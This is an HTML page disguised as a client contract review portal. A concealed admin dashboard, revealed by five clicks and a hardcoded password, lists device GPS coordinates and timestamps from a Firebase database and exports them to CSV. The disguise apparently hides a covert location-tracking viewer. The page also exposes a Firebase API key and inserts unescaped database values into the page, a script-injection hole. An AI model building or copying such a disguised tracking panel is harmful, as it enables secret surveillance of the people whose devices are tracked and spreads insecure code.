<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Client Contract Page</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f7f7f7;
      color: #333;
      overflow-x: hidden;
    }.viewer {
  padding: 2rem;
  text-align: center;
  animation: fadeIn 2s ease-in-out;
}

.viewer h1 {
  font-size: 1.8rem;
  font-weight: bold;
}

.viewer p {
  margin: 1rem 0;
  font-size: 1rem;
}

.admin {
  display: none;
  background-color: #111;
  color: #fff;
  padding: 1rem;
  animation: fadeInUp 1s ease-in-out;
}

table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 1rem;
  font-size: 0.9rem;
}

th, td {
  border: 1px solid #444;
  padding: 0.5rem;
  text-align: center;
}

th {
  background-color: #222;
}

.controls {
  display: flex;
  flex-direction: column;
  gap: 10px;
  margin-top: 10px;
}

.controls input, .controls button {
  padding: 10px;
  border-radius: 4px;
  border: none;
  font-size: 1rem;
}

.controls button {
  background: #2196F3;
  color: #fff;
  cursor: pointer;
}

.daily-log-count {
  margin-top: 1rem;
  font-weight: bold;
  color: #0f0;
}

@keyframes fadeIn {
  0% { opacity: 0; transform: translateY(-20px); }
  100% { opacity: 1; transform: translateY(0); }
}

@keyframes fadeInUp {
  0% { opacity: 0; transform: translateY(30px); }
  100% { opacity: 1; transform: translateY(0); }
}

  </style>
</head>
<body>
  <div class="viewer" id="viewer">
    <h1>Official Contract Review Portal</h1>
    <p>This portal serves as a formal client interaction hub. Contract reviews are logged daily for compliance and transparency.</p>
    <p>Please verify client documents, updates, and contractual engagement policies.</p>
    <p>Generated and timestamped data logs are processed and stored securely for auditing purposes.</p>
  </div>  <div class="admin" id="admin">
    <h2>Admin Dashboard</h2>
    <div class="controls">
      <input type="text" id="searchInput" placeholder="Search by device or location...">
      <button onclick="exportCSV()">Export as CSV</button>
    </div>
    <div class="daily-log-count" id="dailyCount">Daily logs: 0</div>
    <table id="logTable">
      <thead>
        <tr>
          <th>Device</th>
          <th>Latitude</th>
          <th>Longitude</th>
          <th>Timestamp</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const locationRef = ref(database, 'locations');

    const tableBody = document.querySelector("#logTable tbody");
    const dailyCountEl = document.getElementById("dailyCount");

    function formatDate(ts) {
      const d = new Date(ts);
      return d.toLocaleDateString() + ' ' + d.toLocaleTimeString();
    }

    function exportCSV() {
      let csv = 'Device,Latitude,Longitude,Timestamp\n';
      document.querySelectorAll("#logTable tbody tr").forEach(row => {
        const cols = [...row.children].map(td => td.textContent);
        csv += cols.join(',') + '\n';
      });
      const blob = new Blob([csv], { type: 'text/csv' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = 'logs.csv';
      link.click();
    }

    function filterTable(keyword) {
      const rows = document.querySelectorAll("#logTable tbody tr");
      rows.forEach(row => {
        row.style.display = [...row.children].some(td => td.textContent.toLowerCase().includes(keyword)) ? '' : 'none';
      });
    }

    onValue(locationRef, snapshot => {
      const data = snapshot.val();
      tableBody.innerHTML = '';
      let countToday = 0;
      const today = new Date().toDateString();

      Object.values(data || {}).forEach(entry => {
        const ts = new Date(entry.timestamp).toDateString();
        if (ts === today) countToday++;

        const row = `
          <tr>
            <td>${entry.device || 'Unknown'}</td>
            <td>${entry.latitude}</td>
            <td>${entry.longitude}</td>
            <td>${formatDate(entry.timestamp)}</td>
          </tr>`;
        tableBody.innerHTML += row;
      });

      dailyCountEl.textContent = `Daily logs: ${countToday}`;
    });

    document.getElementById("searchInput").addEventListener("input", e => filterTable(e.target.value.toLowerCase()));

    // 5-tap reveal logic + password entry
    let tapCount = 0;
    let tapTimer = null;
    document.body.addEventListener("click", () => {
      tapCount++;
      if (tapTimer) clearTimeout(tapTimer);
      tapTimer = setTimeout(() => tapCount = 0, 1500);
      if (tapCount >= 5) {
        const pass = prompt("Enter admin password:");
        if (pass === "ASCII") {
          document.getElementById("viewer").style.display = "none";
          document.getElementById("admin").style.display = "block";
        } else {
          alert("Wrong password.");
        }
        tapCount = 0;
      }
    });
  </script></body>
  </html>
